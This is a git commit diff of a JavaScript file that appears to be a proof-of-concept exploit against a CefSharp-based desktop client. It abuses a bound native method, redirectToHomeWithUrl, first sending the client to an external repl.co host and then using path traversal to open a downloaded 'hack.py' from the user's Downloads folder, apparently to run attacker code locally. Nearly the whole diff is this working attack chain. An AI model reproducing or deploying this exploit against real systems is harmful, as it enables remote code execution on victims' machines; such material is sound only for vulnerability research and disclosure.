820c9a04d541a528643e7fac0b0b0cd4641914bc
Rakesh Mane <rakeshmane12345@gmail.com>
2020-07-09 22:20:22 +0530

    Update tmp1.js

--- tmp1.js
+++ tmp1.js
@@ -1,18 +1,27 @@
 
-       /* window.CefSharp.BindObjectAsync("as2NativeClient")
+        window.CefSharp.BindObjectAsync("as2NativeClient")
         .then((result) => {
           if(window.as2NativeClient) {
-                  */
-            
-            window.as2NativeClient.redirectToHomeWithUrl("https://disloyalmemorableboards.rakeshmane.repl.co/");
+                  
+            if (window.location.hash!="download_completed")
+            {
+                   window.as2NativeClient.redirectToHomeWithUrl("https://disloyalmemorableboards.rakeshmane.repl.co/");
+                   window.location.hash="download_completed"
+                   window.location.reload()
+            }
+                 else{
+                         window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")   
+                 
+                 }
+
                   // C:\Users\rakesh\AppData\Local\AppStreamClient\app-1.1.160>dir .\..\..\..\..\Downloads
-            window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")   
+           
             //setTimeout('window.as2NativeClient.redirectToHomeWithUrl(".\..\..\..\..\Downloads\hack.py")',2000)      
             
 
             //window.as2NativeClient.redirectToHomeWithUrl("hack.py")
              
                   
-       /*   }
+         }
         })
-*/
+
